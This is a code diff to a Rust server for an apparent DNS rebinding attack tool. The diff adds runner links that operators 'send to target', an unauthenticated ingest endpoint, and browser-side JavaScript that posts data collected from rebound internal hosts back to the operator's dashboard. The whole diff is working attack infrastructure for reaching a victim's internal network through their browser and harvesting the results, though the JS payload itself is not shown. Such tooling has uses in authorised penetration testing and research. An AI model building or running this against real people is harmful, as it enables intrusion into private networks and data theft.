@@ -1,29 +1,36 @@
 //! The two HTTP servers (built on [`axum`]) that pair with the DNS server.
 //!
-//! * [`serve_content`] runs on port 3000. It serves a **dashboard** (`/`) for
-//!   creating/opening projects and a **runner** (`/run`) that drives the
-//!   rebinding attempt using the currently-active project.
+//! * [`serve_content`] runs on port 3000. Most of it is a **dashboard** (`/`)
+//!   gated behind HTTP Basic auth for managing projects and runners. Two routes
+//!   are deliberately left open because the target's browser must reach them
+//!   without credentials: the **runner** (`/run?rid=…`) that drives the rebinding
+//!   attempt, and the **ingest** endpoint (`POST /api/ingest/:rid`) it posts
+//!   results back to. Both are gated instead by an unguessable *report ID*.
 //! * [`serve_standard`] runs on a standard port (80 by default). It serves the
 //!   **rebind frame** (with the active project's payload) and the `GET /stop`
 //!   control endpoint.
 //!
 //! A *project* is a saved set of environment variables plus the JS payload (see
 //! [`crate::project`]). The active project lives in shared state, so opening a
-//! project immediately changes what the runner and the frame serve.
+//! project immediately changes what the frame serves. Activating a runner mints
+//! a report ID and snapshots the active project into a *session*; that runner
+//! renders from (and reports under) the snapshot, so later project changes don't
+//! disturb a link already handed out. The dashboard logs results per report ID.
 
 use std::collections::HashMap;
 use std::net::IpAddr;
 use std::sync::atomic::{AtomicU64, Ordering};
-use std::sync::Arc;
-use std::time::Duration;
+use std::sync::{Arc, RwLock};
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
 
 use axum::extract::{Path, Query, Request, State};
 use axum::http::{header, HeaderValue, StatusCode};
 use axum::middleware::{from_fn, from_fn_with_state, Next};
-use axum::response::{Html, Json, Response};
+use axum::response::{Html, IntoResponse, Json, Response};
 use axum::routing::{get, post};
 use axum::Router;
-use serde::Deserialize;
+use rand::RngCore;
+use serde::{Deserialize, Serialize};
 use serde_json::json;
 use tokio::net::TcpListener;
 use tokio::sync::Notify;
@@ -68,6 +75,59 @@ pub struct Deploy {
     pub standard_port: u16,
 }
 
+/// Cap on how many reports we retain per runner session (oldest dropped past
+/// this).
+const MAX_REPORTS_PER_SESSION: usize = 500;
+
+/// A single result/error a runner collected from a rebound frame, sent back to
+/// the master and held in memory keyed by project name.
+#[derive(Clone, Serialize)]
+struct Report {
+    /// `"result"` or `"error"`.
+    kind: String,
+    /// Frame hostname the report came from.
+    host: String,
+    /// For a result: the arbitrary payload data. For an error: the message.
+    data: serde_json::Value,
+    /// Unix epoch milliseconds when the master received it.
+    time_ms: u64,
+}
+
+/// A runner session: one activation of the attack runner, identified by an
+/// unguessable report ID. The runner page is served (and posts reports back)
+/// unauthenticated using this ID; the master only logs output for IDs it minted.
+struct Session {
+    /// Snapshot of the project as it was when the runner was activated. The
+    /// runner renders from this, so changing the active project later does not
+    /// disturb a link already handed to a target.
+    project: Project,
+    /// Unix epoch milliseconds when the runner was activated.
+    created_ms: u64,
+    /// Results/errors this session's runner(s) have posted back.
+    reports: Vec<Report>,
+}
+
+/// Runner sessions keyed by report ID. Lives in memory for the process lifetime.
+type Sessions = Arc<RwLock<HashMap<String, Session>>>;
+
+/// Current Unix time in milliseconds (0 if the clock is before the epoch).
+fn now_ms() -> u64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_millis() as u64)
+        .unwrap_or(0)
+}
+
+/// Generate an unguessable, URL-safe report ID. Ambiguous characters are
+/// omitted so an operator can read/transcribe an ID by hand if needed.
+fn new_report_id() -> String {
+    const CHARS: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
+    let mut rng = rand::thread_rng();
+    (0..24)
+        .map(|_| CHARS[(rng.next_u32() as usize) % CHARS.len()] as char)
+        .collect()
+}
+
 /// Shared state for the master/content server.
 #[derive(Clone)]
 struct MasterState {
@@ -77,6 +137,8 @@ struct MasterState {
     deploy: Deploy,
     /// Payload used to seed brand-new projects (the startup payload).
     default_payload: Arc<String>,
+    /// Runner sessions keyed by report ID.
+    sessions: Sessions,
 }
 
 /// Serve the dashboard + runner + project API on `bind` (default `:3000`).
@@ -91,25 +153,45 @@ pub async fn serve_content(
         active,
         deploy,
         default_payload: Arc::new(default_payload),
+        sessions: Arc::new(RwLock::new(HashMap::new())),
     };
 
-    let app = Router::new()
-        .route("/", get(dashboard))
+    // Open routes: served WITHOUT auth. The runner page is loaded by the target's
+    // browser, and that browser posts results back — neither can authenticate.
+    // Both are gated instead by the unguessable report ID minted by the master.
+    let open = Router::new()
         .route("/run", get(runner))
+        .route("/api/ingest/:rid", post(api_ingest));
+
+    // Protected routes: the operator's control plane, behind HTTP Basic auth.
+    let protected = Router::new()
+        .route("/", get(dashboard))
         .route("/api/projects", get(api_list))
         .route("/api/defaults", get(api_defaults))
         .route("/api/deploy", get(api_deploy))
-        .route("/api/project/:name", get(api_get).post(api_save))
+        .route(
+            "/api/project/:name",
+            get(api_get).post(api_save).delete(api_delete),
+        )
+        .route("/api/runner", post(api_runner_create))
+        .route("/api/runners", get(api_runners_list))
+        .route(
+            "/api/reports/:rid",
+            get(api_reports_get).delete(api_reports_clear),
+        )
         .route("/api/open/:name", post(api_open))
         .route("/api/active", get(api_active).post(api_set_active))
-        // Gate every master route behind HTTP Basic auth. The standard-port
-        // server is deliberately left open (it serves the rebind frame).
-        .layer(from_fn_with_state(auth_db, auth::require_auth))
+        // Gate every master route behind HTTP Basic auth. The open routes above
+        // and the standard-port server are deliberately left reachable.
+        .layer(from_fn_with_state(auth_db, auth::require_auth));
+
+    let app = open
+        .merge(protected)
         .layer(from_fn(allow_framing))
         .with_state(state);
 
     let listener = TcpListener::bind(bind).await?;
-    tracing::info!("content listening on http://{bind} (dashboard / ; runner /run)");
+    tracing::info!("content listening on http://{bind} (dashboard / ; runner /run?rid=…)");
     axum::serve(listener, app).await?;
     Ok(())
 }
@@ -165,6 +247,116 @@ async fn api_save(
     Ok(Json(project))
 }
 
+async fn api_delete(Path(name): Path<String>) -> Result<StatusCode, (StatusCode, String)> {
+    project::delete(&name).map_err(|e| {
+        let code = if e.kind() == std::io::ErrorKind::NotFound {
+            StatusCode::NOT_FOUND
+        } else {
+            StatusCode::BAD_REQUEST
+        };
+        (code, e.to_string())
+    })?;
+    tracing::info!("deleted project '{name}'");
+    Ok(StatusCode::NO_CONTENT)
+}
+
+/// Activate a runner: mint a fresh report ID, snapshot the active project, and
+/// return the ID plus the (relative) runner URL to hand to the target.
+async fn api_runner_create(State(s): State<MasterState>) -> Json<serde_json::Value> {
+    let project = s.active.read().unwrap().clone();
+    let rid = new_report_id();
+    s.sessions.write().unwrap().insert(
+        rid.clone(),
+        Session {
+            project: project.clone(),
+            created_ms: now_ms(),
+            reports: Vec::new(),
+        },
+    );
+    tracing::info!("activated runner '{rid}' for project '{}'", project.name);
+    Json(json!({
+        "rid": rid,
+        "project": project.name,
+        "url": format!("/run?rid={rid}"),
+    }))
+}
+
+/// Summary of a runner session for the operator's runner list.
+#[derive(Serialize)]
+struct RunnerSummary {
+    rid: String,
+    project: String,
+    created_ms: u64,
+    count: usize,
+}
+
+/// List active runner sessions, newest first.
+async fn api_runners_list(State(s): State<MasterState>) -> Json<Vec<RunnerSummary>> {
+    let map = s.sessions.read().unwrap();
+    let mut list: Vec<RunnerSummary> = map
+        .iter()
+        .map(|(rid, sess)| RunnerSummary {
+            rid: rid.clone(),
+            project: sess.project.name.clone(),
+            created_ms: sess.created_ms,
+            count: sess.reports.len(),
+        })
+        .collect();
+    list.sort_by(|a, b| b.created_ms.cmp(&a.created_ms));
+    Json(list)
+}
+
+#[derive(Deserialize)]
+struct ReportBody {
+    kind: String,
+    #[serde(default)]
+    host: String,
+    #[serde(default)]
+    data: serde_json::Value,
+}
+
+/// Ingest a result/error from a runner. Unauthenticated, but accepted only for a
+/// report ID the master actually minted — unknown IDs are rejected, not stored.
+async fn api_ingest(
+    State(s): State<MasterState>,
+    Path(rid): Path<String>,
+    Json(body): Json<ReportBody>,
+) -> StatusCode {
+    let mut map = s.sessions.write().unwrap();
+    let Some(sess) = map.get_mut(&rid) else {
+        return StatusCode::NOT_FOUND;
+    };
+    sess.reports.push(Report {
+        kind: body.kind,
+        host: body.host,
+        data: body.data,
+        time_ms: now_ms(),
+    });
+    if sess.reports.len() > MAX_REPORTS_PER_SESSION {
+        let overflow = sess.reports.len() - MAX_REPORTS_PER_SESSION;
+        sess.reports.drain(0..overflow);
+    }
+    StatusCode::NO_CONTENT
+}
+
+/// Return the reports logged for a report ID (`404` if the ID is unknown).
+async fn api_reports_get(
+    State(s): State<MasterState>,
+    Path(rid): Path<String>,
+) -> Result<Json<Vec<Report>>, StatusCode> {
+    let map = s.sessions.read().unwrap();
+    match map.get(&rid) {
+        Some(sess) => Ok(Json(sess.reports.clone())),
+        None => Err(StatusCode::NOT_FOUND),
+    }
+}
+
+/// Delete a runner session (its report ID stops accepting reports).
+async fn api_reports_clear(State(s): State<MasterState>, Path(rid): Path<String>) -> StatusCode {
+    s.sessions.write().unwrap().remove(&rid);
+    StatusCode::NO_CONTENT
+}
+
 async fn api_open(
     State(s): State<MasterState>,
     Path(name): Path<String>,
@@ -194,14 +386,35 @@ async fn dashboard() -> Html<&'static str> {
     Html(DASHBOARD_HTML)
 }
 
-async fn runner(State(s): State<MasterState>) -> Html<String> {
-    let project = s.active.read().unwrap().clone();
-    Html(render_runner(&project, &s.deploy))
+#[derive(Deserialize)]
+struct RunnerQuery {
+    #[serde(default)]
+    rid: String,
 }
 
+/// Serve the (unauthenticated) runner page for a report ID. The page and its
+/// config come from the session snapshot; an unknown/expired ID gets a `404`.
+async fn runner(State(s): State<MasterState>, Query(q): Query<RunnerQuery>) -> Response {
+    let project = s
+        .sessions
+        .read()
+        .unwrap()
+        .get(&q.rid)
+        .map(|sess| sess.project.clone());
+    match project {
+        Some(project) => Html(render_runner(&project, &s.deploy, &q.rid)).into_response(),
+        None => (StatusCode::NOT_FOUND, Html(RUNNER_INVALID_HTML)).into_response(),
+    }
+}
+
+/// Shown when `/run` is hit without a valid report ID (e.g. a stale link).
+const RUNNER_INVALID_HTML: &str = "<!doctype html><meta charset=\"utf-8\">\
+<title>rebind</title><p>Invalid or expired link.</p>";
+
 /// Render the runner page. Deployment values (hostname, server IP, port) come
-/// from the environment; the targets/stop window come from the active project.
-fn render_runner(project: &Project, deploy: &Deploy) -> String {
+/// from the environment; the targets/stop window come from the session's project
+/// snapshot. `rid` is the report ID this runner posts its results back under.
+fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
     let server_ip = deploy.server_ip;
     let standard_port = deploy.standard_port;
     let server_label = ip_to_label(server_ip);
@@ -228,7 +441,6 @@ fn render_runner(project: &Project, deploy: &Deploy) -> String {
 </style>
 </head>
 <body>
-  <p><a href="/">&larr; dashboard</a></p>
   <h1>rebind runner &mdash; project: {project_name}</h1>
   <p>One iframe per target. Each loads
      <code>&lt;server_ip&gt;.&lt;rebind_ip&gt;.&lt;random&gt;.{hostname}</code>.
@@ -245,6 +457,21 @@ const SERVER_LABEL  = {server_label:?};
 const STANDARD_PORT = {standard_port};
 const STOP_SECONDS  = {stop_seconds};
 const TARGETS       = [{targets_js}];
+const PROJECT_NAME  = {project_name:?};
+const REPORT_ID     = {rid:?};
+
+// Forward a collected result/error back to the master under this runner's
+// report ID. The endpoint is unauthenticated but only accepts a minted ID.
+async function sendReport(kind, host, data) {{
+  if (!REPORT_ID) return;
+  try {{
+    await fetch("/api/ingest/" + encodeURIComponent(REPORT_ID), {{
+      method: "POST",
+      headers: {{ "content-type": "application/json" }},
+      body: JSON.stringify({{ kind, host, data }}),
+    }});
+  }} catch (e) {{ log("report POST failed: " + e); }}
+}}
 
 const PING_INTERVAL = 1500;
 const PONG_TIMEOUT  = 600;
@@ -326,9 +553,11 @@ window.addEventListener('message', (e) => {{
     const f = frames.find((x) => x.host === d.host);
     log("PAYLOAD frame " + (f ? f.id : "?") + " " + d.host + " -> " +
         JSON.stringify(d.data));
+    sendReport("result", d.host, d.data);
   }} else if (d.type === "error") {{
     const f = frames.find((x) => x.host === d.host);
     log("ERROR frame " + (f ? f.id : "?") + " " + d.host + ": " + d.error);
+    sendReport("error", d.host, d.error);
   }}
 }});
 
@@ -361,6 +590,7 @@ setTimeout(tick, 500);
         standard_port = standard_port,
         stop_seconds = project.stop_seconds_clamped(),
         targets_js = targets_js,
+        rid = rid,
     )
 }
 
@@ -385,6 +615,17 @@ const DASHBOARD_HTML: &str = r##"<!doctype html>
   #deploy code { color:#333; }
   #status { background:#111; color:#0f0; padding:.5rem; border-radius:6px; min-height:1.5rem; white-space:pre-wrap; }
   h1 a, .side a { color:#06c; text-decoration:none; }
+  #reports { margin-top:.5rem; }
+  .report { border:1px solid #ddd; border-left-width:4px; border-radius:4px; margin:.4rem 0; padding:.4rem .6rem; }
+  .report.result { border-left-color:#2a2; }
+  .report.error { border-left-color:#c33; }
+  .report .rhead { font-family:monospace; font-size:12px; color:#555; }
+  .report pre { margin:.3rem 0 0; white-space:pre-wrap; word-break:break-all; }
+  #runners .runner { display:flex; justify-content:space-between; align-items:center; gap:.5rem;
+                     border:1px solid #ddd; border-radius:4px; margin:.3rem 0; padding:.3rem .5rem; }
+  #runners .runner.sel { border-color:#06c; background:#eef5ff; }
+  #runners .meta { font-family:monospace; font-size:12px; }
+  #runnerlink code { font-family:monospace; font-size:12px; word-break:break-all; }
 </style>
 </head>
 <body>
@@ -395,7 +636,8 @@ const DASHBOARD_HTML: &str = r##"<!doctype html>
       <ul id="projlist"></ul>
       <button id="newbtn">+ New (from .env defaults)</button>
       <p>Active: <b id="activename">&mdash;</b></p>
-      <p><a id="runlink" href="/run" target="_blank">Open attack runner &#8599;</a></p>
+      <p><button id="activaterunner">Activate runner &#8599;</button></p>
+      <p id="runnerlink"></p>
       <h3>Deployment <small>(.env only)</small></h3>
       <div id="deploy">loading&hellip;</div>
     </div>
@@ -413,6 +655,17 @@ const DASHBOARD_HTML: &str = r##"<!doctype html>
         <button id="activatebtn">Set Active (no save)</button>
       </p>
       <pre id="status"></pre>
+
+      <h2>Runners</h2>
+      <div id="runners">No runners activated yet.</div>
+
+      <h2>Reports <small id="reportsfor">(no runner selected)</small></h2>
+      <p>
+        <button id="refreshreports">Refresh</button>
+        <button id="clearreports">Delete runner</button>
+        <small>auto-refreshes every 3s while a runner is selected</small>
+      </p>
+      <div id="reports">Activate a runner and send its link to the target.</div>
     </div>
   </div>
 
@@ -445,7 +698,7 @@ function readForm() {
 function fillForm(p) {
   $("name").value = p.name || "";
   $("targets").value = (p.targets || []).join(", ");
-  $("stop").value = p.stop_seconds ?? 20;
+  $("stop").value = p.stop_seconds ?? 5;
   $("payload").value = p.payload || "";
 }
 
@@ -456,11 +709,21 @@ async function refreshProjects() {
   if (!list.length) ul.innerHTML = "<li><i>(none saved)</i></li>";
   list.forEach((n) => {
     const li = document.createElement("li");
-    li.innerHTML = "<span></span> <button>Open</button>";
+    li.innerHTML = "<span></span> <span><button class='open'>Open</button> <button class='del'>Delete</button></span>";
     li.querySelector("span").textContent = n;
-    li.querySelector("button").onclick = () => openProject(n);
+    li.querySelector("button.open").onclick = () => openProject(n);
+    li.querySelector("button.del").onclick = () => deleteProject(n);
     ul.appendChild(li);
   });
+}
+
+async function deleteProject(n) {
+  if (!confirm("Delete project \"" + n + "\"? This cannot be undone.")) return;
+  try {
+    await api("DELETE", "/api/project/" + encodeURIComponent(n));
+    await refreshProjects();
+    status("Deleted: " + n);
+  } catch (e) { status(String(e)); }
 }
 
 async function loadDeploy() {
@@ -472,6 +735,113 @@ async function loadDeploy() {
   codes[0].textContent = d.hostname;
   codes[1].textContent = d.server_ip;
   codes[2].textContent = d.standard_port + port;
+}
+
+let scopedRid = null;
+let reportTimer = null;
+
+function renderReports(items) {
+  const box = $("reports");
+  if (!items || !items.length) { box.innerHTML = "<i>(no reports yet)</i>"; return; }
+  box.innerHTML = "";
+  items.slice().reverse().forEach((r) => {
+    const div = document.createElement("div");
+    div.className = "report " + (r.kind === "error" ? "error" : "result");
+    const head = document.createElement("div");
+    head.className = "rhead";
+    const t = new Date(r.time_ms).toLocaleTimeString();
+    head.textContent = "[" + t + "] " + r.kind.toUpperCase() + "  " + r.host;
+    const body = document.createElement("pre");
+    body.textContent = typeof r.data === "string" ? r.data : JSON.stringify(r.data, null, 2);
+    div.appendChild(head);
+    div.appendChild(body);
+    box.appendChild(div);
+  });
+}
+
+async function loadReports() {
+  if (!scopedRid) return;
+  try {
+    const items = await api("GET", "/api/reports/" + encodeURIComponent(scopedRid));
+    renderReports(items);
+  } catch (e) {
+    // The session was deleted (404) or another error occurred: stop polling.
+    selectRunner(null);
+  }
+}
+
+function selectRunner(rid) {
+  scopedRid = rid || null;
+  if (reportTimer) { clearInterval(reportTimer); reportTimer = null; }
+  if (scopedRid) {
+    $("reportsfor").textContent = "(report id: " + scopedRid + ")";
+    loadReports();
+    reportTimer = setInterval(loadReports, 3000);
+  } else {
+    $("reportsfor").textContent = "(no runner selected)";
+    $("reports").innerHTML = "Activate a runner and send its link to the target.";
+  }
+  markSelectedRunner();
+}
+
+function markSelectedRunner() {
+  document.querySelectorAll("#runners .runner").forEach((el) => {
+    el.classList.toggle("sel", el.dataset.rid === scopedRid);
+  });
+}
+
+async function refreshRunners() {
+  const list = await api("GET", "/api/runners");
+  const box = $("runners");
+  box.innerHTML = "";
+  if (!list.length) { box.innerHTML = "No runners activated yet."; return; }
+  list.forEach((r) => {
+    const div = document.createElement("div");
+    div.className = "runner";
+    div.dataset.rid = r.rid;
+    const meta = document.createElement("span");
+    meta.className = "meta";
+    const t = new Date(r.created_ms).toLocaleTimeString();
+    meta.textContent = r.project + " · " + r.rid.slice(0, 8) + "… · " +
+                       r.count + " report(s) · " + t;
+    const btns = document.createElement("span");
+    const view = document.createElement("button");
+    view.textContent = "View";
+    view.onclick = () => selectRunner(r.rid);
+    const del = document.createElement("button");
+    del.textContent = "Delete";
+    del.onclick = () => deleteRunner(r.rid);
+    btns.appendChild(view);
+    btns.appendChild(document.createTextNode(" "));
+    btns.appendChild(del);
+    div.appendChild(meta);
+    div.appendChild(btns);
+    box.appendChild(div);
+  });
+  markSelectedRunner();
+}
+
+async function activateRunner() {
+  try {
+    const r = await api("POST", "/api/runner");
+    const url = location.origin + r.url;
+    $("runnerlink").innerHTML = "Runner link (send to target):<br><code></code>";
+    $("runnerlink").querySelector("code").textContent = url;
+    await refreshRunners();
+    selectRunner(r.rid);
+    status("Activated runner for '" + r.project + "' — report id " + r.rid);
+  } catch (e) { status(String(e)); }
+}
+
+async function deleteRunner(rid) {
+  if (!confirm("Delete this runner and its reports? The link will stop working.")) return;
+  await api("DELETE", "/api/reports/" + encodeURIComponent(rid));
+  if (scopedRid === rid) selectRunner(null);
+  await refreshRunners();
+}
+
+async function clearReports() {
+  if (scopedRid) await deleteRunner(scopedRid);
 }
 
 async function openProject(n) {
@@ -511,8 +881,12 @@ async function init() {
   $("newbtn").onclick = newProject;
   $("savebtn").onclick = save;
   $("activatebtn").onclick = activate;
+  $("activaterunner").onclick = activateRunner;
+  $("refreshreports").onclick = loadReports;
+  $("clearreports").onclick = clearReports;
   await loadDeploy();
   await refreshProjects();
+  await refreshRunners();
   const active = await api("GET", "/api/active");
   fillForm(active);
   $("activename").textContent = active.name || "(unsaved)";
